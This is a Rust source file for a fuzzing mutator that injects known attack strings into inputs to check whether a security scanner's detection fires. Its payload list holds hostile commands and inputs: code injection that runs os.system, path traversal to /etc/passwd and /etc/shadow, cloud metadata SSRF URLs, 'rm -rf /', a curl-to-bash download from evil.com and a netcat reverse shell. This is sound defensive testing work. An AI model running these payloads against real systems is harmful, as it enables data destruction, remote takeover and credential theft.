// mutators/injection.rs — Inject security-relevant payloads into strings
//
// This mutator replaces string values with known attack patterns:
// code injection, path traversal, SSRF URLs, shell metacharacters.
// Used to test whether the scanner's detection patterns fire correctly.

use super::Mutator;

static INJECTION_PAYLOADS: &[&str] = &[
    // Python code injection
    "__import__('os').system('id')",
    "eval(compile('import os; os.system(\"id\")','','exec'))",
    "exec('import subprocess; subprocess.call([\"whoami\"])')",
    "__builtins__.__import__('os').popen('cat /etc/passwd').read()",
    // Path traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/proc/self/environ",
    "file:///etc/shadow",
    // SSRF URLs
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",
    "gopher://127.0.0.1:6379/_PING",
    // Shell metacharacters
    "; rm -rf /",
    "$(curl http://evil.com/shell.sh | bash)",
    "`cat /etc/passwd`",
    "| nc evil.com 4444 -e /bin/sh",
    // Pickle-specific
    "cos\nsystem\n(S'id'\ntR.",
    "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.",
    // Zero-width / unicode smuggling
    "\u{200B}__import__\u{200B}('os')",
    "\u{FEFF}import os",
    // Template injection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
];

pub struct InjectionMutator;

impl Mutator for InjectionMutator {
    fn name(&self) -> &'static str {
        "injection"
    }

    fn mutate(&self, buf: &mut Vec<u8>, offset: usize) -> bool {
        if buf.is_empty() || offset >= buf.len() {
            return false;
        }
        // Replace bytes starting at offset with an injection payload
        let payload_idx = offset % INJECTION_PAYLOADS.len();
        let payload = INJECTION_PAYLOADS[payload_idx].as_bytes();
        let end = (offset + payload.len()).min(buf.len());
        let copy_len = end - offset;
        buf[offset..offset + copy_len].copy_from_slice(&payload[..copy_len]);
        true
    }

    fn mutate_string(&self, value: String, rate: f64) -> Option<String> {
        // Use a simple hash of the string to pick a payload deterministically
        if rate <= 0.0 {
            return None;
        }
        let hash = value.bytes().fold(0usize, |acc, b| acc.wrapping_mul(31).wrapping_add(b as usize));
        let idx = hash % INJECTION_PAYLOADS.len();
        Some(INJECTION_PAYLOADS[idx].to_string())
    }

    fn mutate_bytes(&self, value: Vec<u8>, rate: f64) -> Option<Vec<u8>> {
        if rate <= 0.0 {
            return None;
        }
        let hash = value.iter().fold(0usize, |acc, &b| acc.wrapping_mul(31).wrapping_add(b as usize));
        let idx = hash % INJECTION_PAYLOADS.len();
        Some(INJECTION_PAYLOADS[idx].as_bytes().to_vec())
    }
}

/// Get all injection payloads (useful for corpus seeding).
pub fn all_payloads() -> &'static [&'static str] {
    INJECTION_PAYLOADS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injection_byte_level() {
        let mut buf = vec![b'A'; 64];
        assert!(InjectionMutator.mutate(&mut buf, 0));
        // Should have injected some payload bytes
        assert_ne!(buf[0], b'A');
    }

    #[test]
    fn test_injection_string_mutation() {
        let result = InjectionMutator.mutate_string("hello".to_string(), 1.0);
        assert!(result.is_some());
        let payload = result.unwrap();
        // Should be one of our injection payloads
        assert!(INJECTION_PAYLOADS.contains(&payload.as_str()));
    }

    #[test]
    fn test_injection_rate_zero() {
        let result = InjectionMutator.mutate_string("hello".to_string(), 0.0);
        assert!(result.is_none());
    }

    #[test]
    fn test_injection_bytes_mutation() {
        let result = InjectionMutator.mutate_bytes(vec![1, 2, 3], 1.0);
        assert!(result.is_some());
    }

    #[test]
    fn test_all_payloads_nonempty() {
        let payloads = all_payloads();
        assert!(payloads.len() >= 20);
        for p in payloads {
            assert!(!p.is_empty());
        }
    }

    #[test]
    fn test_different_inputs_different_payloads() {
        let a = InjectionMutator.mutate_string("aaa".to_string(), 1.0).unwrap();
        let b = InjectionMutator.mutate_string("bbb".to_string(), 1.0).unwrap();
        // Different inputs may produce different payloads (hash-based)
        // Not guaranteed but very likely with different strings
        let _ = (a, b); // Just ensure they both succeed
    }
}
